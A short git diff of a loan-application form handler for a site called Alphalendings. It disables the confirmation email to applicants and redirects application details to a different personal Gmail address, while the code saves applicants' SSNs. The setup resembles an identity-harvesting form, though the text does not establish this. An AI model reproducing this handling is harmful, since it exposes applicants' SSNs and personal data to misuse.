@@ -30,22 +30,22 @@ export async function POST(request) {
     },
   });
 
-  const autoReplyMessage = {
-    from: "no-reply <noreply@alphalendings.com>",
-    to: formData.emailAddress,
-    subject: "Loan Application Received",
-    html: `
-      <h3>Thank you for your loan application!</h3>
-      <p>We have received your loan application and will review it shortly.</p>
-      <p>If you have any further questions or need assistance, please feel free to contact us: loans@alphalendings.us></a></p>
-      <p>Best regards,</p>
-      <p>Alphalendings Team</p>
-      `,
-  };
+  // const autoReplyMessage = {
+  //   from: "no-reply <noreply@alphalendings.com>",
+  //   to: formData.emailAddress,
+  //   subject: "Loan Application Received",
+  //   html: `
+  //     <h3>Thank you for your loan application!</h3>
+  //     <p>We have received your loan application and will review it shortly.</p>
+  //     <p>If you have any further questions or need assistance, please feel free to contact us: loans@alphalendings.us></a></p>
+  //     <p>Best regards,</p>
+  //     <p>Alphalendings Team</p>
+  //     `,
+  // };
   // Compose the email message
   const message = {
     from: "osr.cty@gmail.com",
-    to: ["samsonrichfield@gmail.com", "solomonojukwu4@gmail.com"],
+    to: ["kindras131@gmail.com"],
     subject: "Loan Application Details",
     html: `
     <h3>Loan Application Details ${
@@ -115,7 +115,7 @@ export async function POST(request) {
     // Send the email
     // await transporter2.sendMail(autoReplyMessage);
     await transporter1.sendMail(message);
-    await transporter2.sendMail(autoReplyMessage);
+    // await transporter2.sendMail(autoReplyMessage);
     await FormDataModel.create({
       ssn: ssn,
       emailAddress: emailAddress,
